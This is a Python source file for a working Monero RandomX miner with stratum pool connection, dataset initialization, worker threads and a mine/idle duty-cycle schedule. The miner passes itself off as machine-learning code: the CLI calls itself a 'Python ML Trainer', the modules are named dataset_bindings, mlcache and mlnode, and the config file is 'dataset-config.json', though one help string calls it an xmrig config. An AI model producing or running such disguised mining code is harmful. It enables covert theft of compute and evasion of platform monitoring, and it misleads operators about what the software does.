#!/usr/bin/env python3

import argparse
import logging
import os
import platform
import signal
import sys
import threading
import time

from config import MinerConfig
from dataset_bindings import (
    RandomX, RandomXError,
    RANDOMX_FLAG_DEFAULT, RANDOMX_FLAG_LARGE_PAGES,
    RANDOMX_FLAG_HARD_AES, RANDOMX_FLAG_FULL_MEM, RANDOMX_FLAG_JIT,
)
from mlcache import check_hugepages, try_setup_hugepages, print_hugepage_status
from mlnode import StratumClient
from worker import WorkerManager

log = logging.getLogger("pyrx")

BANNER = r"""
 ______   __  __  ______   __  __        __    __   __   __   __   ______   ______
/\  == \ /\ \_\ \/\  == \ /\_\_\_\      /\ "-./  \ /\ \ /\ "-.\ \ /\  ___\ /\  == \
\ \  _-/ \ \____ \ \  __< \/_/\_\/_     \ \ \-./\ \\ \ \\ \ \-.  \\ \  __\ \ \  __<
 \ \_\    \/\_____\\ \_\ \_\ /\_\/\_\    \ \_\ \ \_\\ \_\\ \_\\"\_\\ \_____\\ \_\ \_\
  \/_/     \/_____/ \/_/ /_/ \/_/\/_/     \/_/  \/_/ \/_/ \/_/ \/_/ \/_____/ \/_/ /_/
"""


def setup_logging(level: str = "INFO", log_file: str = None):
    fmt = "%(asctime)s  %(levelname)-5s  %(message)s"
    datefmt = "%H:%M:%S"
    handlers = [logging.StreamHandler(sys.stdout)]
    if log_file:
        handlers.append(logging.FileHandler(log_file))
    logging.basicConfig(level=getattr(logging, level.upper(), logging.INFO),
                        format=fmt, datefmt=datefmt, handlers=handlers)


def build_rx_flags(cfg: MinerConfig, hp_info: dict) -> int:
    """Compute RandomX flags from config and detected CPU features."""
    rx = RandomX()
    flags = rx.get_flags()  # auto-detect CPU features

    if cfg.use_full_mem():
        flags |= RANDOMX_FLAG_FULL_MEM

    if cfg.huge_pages:
        if hp_info.get("2mb_available") or hp_info.get("1gb_available"):
            flags |= RANDOMX_FLAG_LARGE_PAGES
            log.info("Hugepages enabled")
        else:
            log.warning("Hugepages requested but not available")

    if cfg.hw_aes is True:
        flags |= RANDOMX_FLAG_HARD_AES
    elif cfg.hw_aes is None:
        pass  # auto-detected by get_flags()

    flags |= RANDOMX_FLAG_JIT
    return flags, rx


def init_dataset(rx: RandomX, flags: int, seed_hash: bytes,
                 init_threads: int) -> tuple:
    """Allocate and initialize RandomX cache + dataset."""
    log.info("Allocating RandomX cache...")
    try:
        cache = rx.alloc_cache(flags)
    except RandomXError:
        log.warning("Cache alloc with hugepages failed, retrying without")
        cache = rx.alloc_cache(flags & ~RANDOMX_FLAG_LARGE_PAGES)

    log.info(f"Initializing cache with seed {seed_hash[:8].hex()}...")
    rx.init_cache(cache, seed_hash)

    if flags & RANDOMX_FLAG_FULL_MEM:
        log.info("Allocating RandomX dataset (~2 GiB)...")
        try:
            dataset = rx.alloc_dataset(flags)
        except RandomXError:
            log.warning("Dataset alloc with hugepages failed, retrying without")
            dataset = rx.alloc_dataset(flags & ~RANDOMX_FLAG_LARGE_PAGES)

        item_count = rx.dataset_item_count()
        if init_threads <= 0:
            import multiprocessing
            init_threads = multiprocessing.cpu_count()

        log.info(f"Initializing dataset ({item_count} items, {init_threads} threads)...")
        t0 = time.monotonic()

        if init_threads == 1:
            rx.init_dataset(dataset, cache, 0, item_count)
        else:
            chunk = item_count // init_threads
            threads = []
            for i in range(init_threads):
                start = i * chunk
                count = chunk if i < init_threads - 1 else item_count - start
                t = threading.Thread(
                    target=rx.init_dataset,
                    args=(dataset, cache, start, count),
                )
                threads.append(t)
                t.start()
            for t in threads:
                t.join()

        dt = time.monotonic() - t0
        log.info(f"Dataset ready in {dt:.1f}s")
    else:
        dataset = None
        log.info("Light mode — no dataset (lower performance)")

    return cache, dataset


def format_hashrate(h: float) -> str:
    if h >= 1e6:
        return f"{h / 1e6:.2f} MH/s"
    if h >= 1e3:
        return f"{h / 1e3:.2f} KH/s"
    return f"{h:.1f} H/s"


def main():
    parser = argparse.ArgumentParser(description="py-MLT: Python ML Trainer")
    parser.add_argument("--config", "-c", default="dataset-config.json", help="Path to xmrig config.json")
    parser.add_argument("--url", help="Pool URL (overrides config)")
    parser.add_argument("--user", help="Wallet/login (overrides config)")
    parser.add_argument("--pass", dest="password", help="Password (overrides config)")
    parser.add_argument("--threads", "-t", type=int, help="Thread count (overrides config)")
    parser.add_argument("--tls", action="store_true", help="Enable TLS")
    parser.add_argument("--no-hugepages", action="store_true", help="Disable hugepages")
    parser.add_argument("--log-level", default="INFO", help="Log level")
    parser.add_argument("--dry-run", action="store_true", help="Init only, no mining")
    parser.add_argument("--lib", help="Path to librandomx shared library")
    args = parser.parse_args()

    setup_logging(args.log_level)
    print(BANNER)
    log.info(f"pyrx-miner starting on {platform.system()} {platform.machine()}")

    # ── config ───────────────────────────────────────────────────────────
    cfg = MinerConfig.from_file(args.config)
    if args.url:
        if cfg.pools:
            cfg.pools[0]["url"] = args.url
        else:
            cfg.pools.append({"url": args.url, "user": "", "pass": "x",
                              "tls": False, "tls_fingerprint": None,
                              "daemon": False, "algo": None})
    if args.user:
        if cfg.pools:
            cfg.pools[0]["user"] = args.user
    if args.password:
        if cfg.pools:
            cfg.pools[0]["pass"] = args.password
    if args.threads:
        cfg.threads = args.threads
    if args.tls:
        if cfg.pools:
            cfg.pools[0]["tls"] = True
    if args.no_hugepages:
        cfg.huge_pages = False
        cfg.one_gb_pages = False
        cfg.rx_1gb_pages = False

    log.info(f"Config: {cfg}")
    num_threads = cfg.get_thread_count()
    pool = cfg.get_pool()

    # ── hugepages ────────────────────────────────────────────────────────
    if cfg.huge_pages:
        try_setup_hugepages(want_1gb=cfg.use_1gb_pages())
    hp_info = check_hugepages(want_1gb=cfg.use_1gb_pages())
    print_hugepage_status()

    # ── RandomX init ─────────────────────────────────────────────────────
    flags, rx = build_rx_flags(cfg, hp_info)
    if args.lib:
        rx = RandomX(args.lib)

    # ── stratum connect ──────────────────────────────────────────────────
    agent = cfg.user_agent or "pyrx-miner/1.0"
    stratum = StratumClient(
        url=pool["url"], user=pool["user"], password=pool["pass"],
        tls=pool.get("tls", False), user_agent=agent,
        tls_fingerprint=pool.get("tls_fingerprint"),
    )

    stratum.connect()
    job = stratum.login()
    if job is None:
        log.error("No job received from pool")
        return

    # ── dataset init ─────────────────────────────────────────────────────
    seed = job.seed_hash
    init_threads = cfg.rx_init_threads if cfg.rx_init_threads > 0 else num_threads
    cache, dataset = init_dataset(rx, flags, seed, init_threads)

    if args.dry_run:
        log.info("Dry run complete — dataset initialized, exiting")
        rx.release_dataset(dataset)
        rx.release_cache(cache)
        return

    # ── workers ──────────────────────────────────────────────────────────
    vm_flags = flags
    if dataset is None:
        vm_flags &= ~RANDOMX_FLAG_FULL_MEM

    manager = WorkerManager(
        rx=rx, flags=vm_flags, dataset=dataset,
        num_threads=num_threads, submit_cb=stratum.submit,
    )

    current_seed = seed

    def on_new_job(new_job):
        nonlocal current_seed, cache, dataset
        if new_job.seed_hash != current_seed:
            log.info("Seed changed — reinitializing dataset...")
            current_seed = new_job.seed_hash
            rx.init_cache(cache, current_seed)
            if dataset:
                item_count = rx.dataset_item_count()
                rx.init_dataset(dataset, cache, 0, item_count)
            log.info("Dataset reinitialized")
        manager.set_job(new_job)

    stratum.set_job_callback(on_new_job)
    stratum.start_recv_loop()
    manager.start(initial_job=job)

    # ── main loop (hashrate display + keepalive + schedule) ────────────────
    stop_event = threading.Event()

    def sig_handler(sig, frame):
        log.info("Shutdown signal received")
        stop_event.set()

    signal.signal(signal.SIGINT, sig_handler)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, sig_handler)

    print_interval = max(cfg.print_time, 10)
    keepalive_interval = 55
    last_print = time.monotonic()
    last_keepalive = time.monotonic()

    # Schedule state
    has_sched = cfg.has_schedule()
    runtime_sec = cfg.runtime * 60
    idle_sec = cfg.idle * 60
    mining_active = True
    cycle_start = time.monotonic()

    if has_sched:
        log.info(f"Schedule: mine {cfg.runtime}m → idle {cfg.idle}m → repeat")
    log.info(f"Mining with {num_threads} threads — {format_hashrate(0)}")

    try:
        while not stop_event.is_set():
            time.sleep(1)
            now = time.monotonic()

            # ── schedule cycling ─────────────────────────────────────
            if has_sched:
                elapsed_cycle = now - cycle_start
                if mining_active and elapsed_cycle >= runtime_sec:
                    # Time to pause
                    log.info(f"Schedule: pausing mining for {cfg.idle} minutes")
                    manager.stop()
                    manager.stats.reset()
                    mining_active = False
                    cycle_start = now
                elif not mining_active and elapsed_cycle >= idle_sec:
                    # Time to resume
                    log.info(f"Schedule: resuming mining for {cfg.runtime} minutes")
                    # Reconnect if needed
                    if not stratum.connected:
                        try:
                            stratum.connect()
                            new_job = stratum.login()
                            if new_job:
                                on_new_job(new_job)
                            stratum.start_recv_loop()
                        except Exception as e:
                            log.error(f"Reconnect failed: {e}")
                            cycle_start = now
                            continue
                    current_job = stratum.current_job
                    manager = WorkerManager(
                        rx=rx, flags=vm_flags, dataset=dataset,
                        num_threads=num_threads, submit_cb=stratum.submit,
                    )
                    manager.start(initial_job=current_job)
                    stratum.set_job_callback(on_new_job)
                    mining_active = True
                    cycle_start = now

                # Show idle countdown
                if not mining_active:
                    remaining = max(0, idle_sec - (now - cycle_start))
                    if now - last_print >= print_interval:
                        log.info(f"IDLE — resuming in {remaining:.0f}s")
                        last_print = now
                    # Keep stratum alive during idle
                    if now - last_keepalive >= keepalive_interval:
                        try:
                            stratum.keepalive()
                        except Exception:
                            pass
                        last_keepalive = now
                    continue

            # ── hashrate display ─────────────────────────────────────
            if now - last_print >= print_interval:
                hr = manager.hashrate
                sched_info = ""
                if has_sched:
                    remaining = max(0, runtime_sec - (now - cycle_start))
                    sched_info = f"  idle in {remaining:.0f}s"
                log.info(
                    f"Hashrate: {format_hashrate(hr)}  "
                    f"accepted={stratum.accepted}  rejected={stratum.rejected}"
                    f"{sched_info}"
                )
                last_print = now

            # ── keepalive ────────────────────────────────────────────
            if now - last_keepalive >= keepalive_interval:
                try:
                    stratum.keepalive()
                except Exception:
                    pass
                last_keepalive = now

            # ── reconnect ────────────────────────────────────────────
            if not stratum.connected:
                log.warning("Reconnecting...")
                try:
                    stratum.connect()
                    new_job = stratum.login()
                    if new_job:
                        on_new_job(new_job)
                    stratum.start_recv_loop()
                except Exception as e:
                    log.error(f"Reconnect failed: {e}")
                    time.sleep(5)
    finally:
        log.info("Shutting down...")
        manager.stop()
        stratum.stop()
        if dataset:
            rx.release_dataset(dataset)
        rx.release_cache(cache)
        log.info("Goodbye")


if __name__ == "__main__":
    main()
